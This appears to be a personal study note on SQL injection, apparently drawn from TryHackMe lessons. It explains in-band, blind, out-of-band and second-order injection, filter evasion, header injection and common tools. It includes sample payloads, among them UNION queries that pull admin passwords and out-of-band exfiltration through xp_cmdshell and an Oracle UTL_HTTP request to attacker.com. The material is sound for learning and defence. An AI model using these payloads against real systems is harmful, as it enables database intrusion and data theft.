**What is SQL Injection?  

The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.  

**What does it look like?**  
Take the following scenario where you've come across an online blog, and each blog entry has a unique ID number. The blog entries may be either set to public or private, depending on whether they're ready for public release. The URL for each blog entry may look something like this:  
  
`https://website.thm/blog?id=1`  
  
From the URL above, you can see that the blog entry selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:  
  
`SELECT * from blog where id=1 and private=0 LIMIT 1;`  
  
From what you've learned in the previous task, you should be able to work out that the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match.  
  
As was mentioned at the start of this task, SQL Injection is introduced when user input is introduced into the database query. In this instance, the id parameter from the query string is used directly in the SQL query.  
  
Let's pretend article ID 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:  
   
`https://website.thm/blog?id=2;--`  
  
Which would then, in turn, produce the SQL statement:  
  
`SELECT * from blog where id=2;-- and private=0 LIMIT 1;`  
  
**The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment**. By doing this, you're just, in fact, running the query:  
  
`SELECT * from blog where id=2;--`

# In-Band SQLi

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

### **Error-Based SQL Injection**

This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 
Example: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`

### **Union-Based SQL Injection**

This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.
Example: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`

# **Blind SQLi**

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successfully enumerate a whole database.

### **Boolean Based**

Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, with just these two responses, it's possible to enumerate a whole database structure and contents.
Example: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`

### **Time-Based**

A time-based blind SQL injection is very similar to the above boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as **SLEEP(x)** alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.
Example: `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`
# Out-of-band SQL Injection
Is used when the attacker cannot use the same channel to launch the attack and gather results or when the server responses are unstable. This technique relies on the database server making an out-of-band request (e.g., HTTP or DNS) to send the query result to the attacker. HTTP is normally used in out-of-band SQL injection to send the query result to the attacker's server.
**By different communication channels**, attackers can minimize the risk of detection and maintain a persistent connection with the compromised system.
Out-of-band SQL injection attacks utilize the methodology of writing to another communication channel through a crafted query.
### Techniques in Different Databases
#### MySQL and MariaDB
Out-of-band SQL injection can be achieved using `SELECT...INTO OUTFILE` or `load_file`command. Example, `SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`
An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.
#### Microsoft SQL Server (MSSQL)
We can achieve OOB SQL injection using features like xp_cmdshell, which allows the execution of [[shell]] commands directly from SQL queries.
 `EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`
 Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.
#### Oracle
Can be achieve using the UTL_HTTP or UTL_FILE packges.For instance, the UTL_HTTP package can be used to send HTTP requests with sensitive data:

 `DECLARE   req UTL_HTTP.REQ;   resp UTL_HTTP.RESP; BEGIN   req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);   UTL_HTTP.GET_RESPONSE(req); END;`

# Second-Order SQL Injection
Also known as stored SQL injection, exploits vulnerabilities where user-supplied input is saved and subsequently used om a different part of the application, possibly after some initial processing. 
Example:
Normal query in application: `UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';`
SQL command: `12345'; UPDATE books SET book_name = 'Hacked'; --
`

# Filter Evasion Techniques
#### Character Encoding
- **URL Encoding** characters are represented using the percent (%) sign followed by their ASCII value in hexadecimal. For example, the payload `' OR 1=1 --` can be encoded as `%27%20OR%201%3D1--`.
- **Hexadecimal Encoding** can be used to construct SQL queries. For instance, the query `SELECT * FROM users WHERE name = 'admin'` can be encoded as `SELECT * FROM users WHERE name = 0x61646d696e`.
- **Unicode Encoding** represents characters using Unicode escape sequences. `admin` can be encoded as `\u0061\u0064\u006d\u0069\u006e`.
### No-Quote SQL Injection
When the application filters single or double quotes or escapes.
- **Using Numerical Values**: One approach is to use numerical values or other data types that do not require quotes. For example, instead of injecting `' OR '1'='1`, an attacker can use `OR 1=1` in a context where quotes are not necessary.
- **Using SQL Comments**: You can use the SQL comments too terminate the rest of the query. For instance, the input `admin'--` can be transformed into `admin--`, where the `--` signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. This can help bypass filters and prevent syntax errors.
- **Using CONCAT() Function**: You can use `CONCAT()` to construct strings without quotes. For example, `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` constructs the string admin.
### No Spaces Allowed
When spaces are not allowed or filtered out.
- **Comments to Replace Spaces**: Using (`/**/`) you can replace spaces. For example, `SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'`
- **Tab or Newline Characters**: Using `\t`or `\n` to substitute spaces.
- **Alternate Characters**: One effective method is using alternative URL-encoded character such as `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space).
### Banned Words and Symbols
When dealing with a word filter.
- **Mixing Lower and Upper Case**: When the query is not made all lower case or upper case we can employ this technique. For example, `SElEcT * FrOm users or SE/**/LECT * FROM/**/users`.
- **Alternative Logical Operators**: Using `||` for OR and `&&` for AND, or encoded characters.
- **Using Equivalents In Hexa or Unicode**: `SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)`
# HTTP Header Injection
HTTP headers can carry user input, which might be used in SQL queries on the server side. The technique involves manipulating HTTP header (like User-Agent, Referer, or X-Forwarded-For) to inject SQL commands.
Here's an example: `curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://10.10.130.50/httpagent/`
## Exploiting Stored Procedures
Stored procedures are routines stored in the database that can perform various operation, such as inserting, updating, or querying data. While stored procedures can help improve performance and ensure consistency.
Stored procedures are precompiled SQL statements that can be executed as a single unit. They are stored in the database and can be called by applications to perform specific tasks. Stored procedures can accept parameters, which can make them flexible and powerful. However, if these parameters are not properly sanitized, they can introduce SQL injection vulnerabilities.
#### XML and JSON Injection    
Applications that parse [[XML]] or JSON data and use the parsed data in SQL queries can be vulnerable to injection if they do not properly sanitize the inputs. XML and JSON injection involves injecting malicious data into XML or JSON structures that are then used in SQL queries. This can occur if the application directly uses parsed values in SQL statements.
 `{   "username": "admin' OR '1'='1--",   "password": "password" }`
If the application uses these values directly in a SQL query like `SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password'`, it could result in an injection.

# Tools
- **[SQLMap](https://github.com/sqlmapproject/sqlmap)**: [[SQLMap]] is an open-source tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web applications. It supports a wide range of databases and provides extensive options for both identification and exploitation. You can learn more about the tool [here](https://tryhackme.com/r/room/sqlmap).
- **[SQLNinja](https://github.com/xxgrunge/sqlninja)**: SQLNinja is a tool specifically designed to exploit SQL Injection vulnerabilities in web applications that use Microsoft SQL Server as the backend database. It automates various stages of exploitation, including database fingerprinting and data extraction. 
- [**JSQL Injection**](https://github.com/ron190/jsql-injection): A Java library focused on detecting SQL injection vulnerabilities within Java applications. It supports various types of SQL Injection attacks and provides a range of options for extracting data and taking control of the database.
- **[BBQSQL](https://github.com/CiscoCXSecurity/bbqsql)**: BBQSQL is a Blind SQL Injection exploitation framework designed to be simple and highly effective for automated exploitation of Blind SQL Injection vulnerabilities.

### Finding SQL Flavor
- Oracle: `select * from V$VERSION;`
- DB2: `select service_level from sysibmadm.env_inst_info;`
- PostgreSQL: `select version();`
- SQL Server: `select @@version;`
- MariaDB: `select version();`
- MySQL: `select version();`
- H2: `SELECT H2VERSION() FROM DUAL`
- SQLite: `select sqlite_version();`
- Firebird: `select rdb$get_context('SYSTEM', 'ENGINE_VERSION') as version from rdb$database;`